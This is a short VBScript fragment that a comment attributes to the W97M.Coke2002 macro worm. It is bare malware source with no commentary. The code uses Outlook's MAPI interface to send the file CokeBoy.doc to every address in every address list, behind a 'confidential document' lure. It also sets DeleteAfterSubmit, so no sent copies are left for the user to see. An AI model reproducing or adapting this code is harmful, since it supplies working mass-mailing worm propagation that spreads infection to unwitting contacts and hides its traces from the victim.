'From W97M.Coke2002
On Error Resume Next
Set out=CreateObject("Outlook.Application")
Set map=out.GetNameSpace("MAPI")
For Each C in map.AddressLists
If C.AddressEntries.Count <> 0 Then
For D=1 To C.AddressEntries.Count
Set E=C.AddressEntries(D)
Set env=out.CreateItem(0)
env.To=E.Address
env.Subject="CokeBoy"
env.Body="A confidential document is for you.. only for u!"
env.Attachments.Add("C:\NV\CokeBoy.doc")
env.DeleteAfterSubmit=True
If env.To <> "" Then
env.Send
End If
Next
End If
Next
WScript.Quit
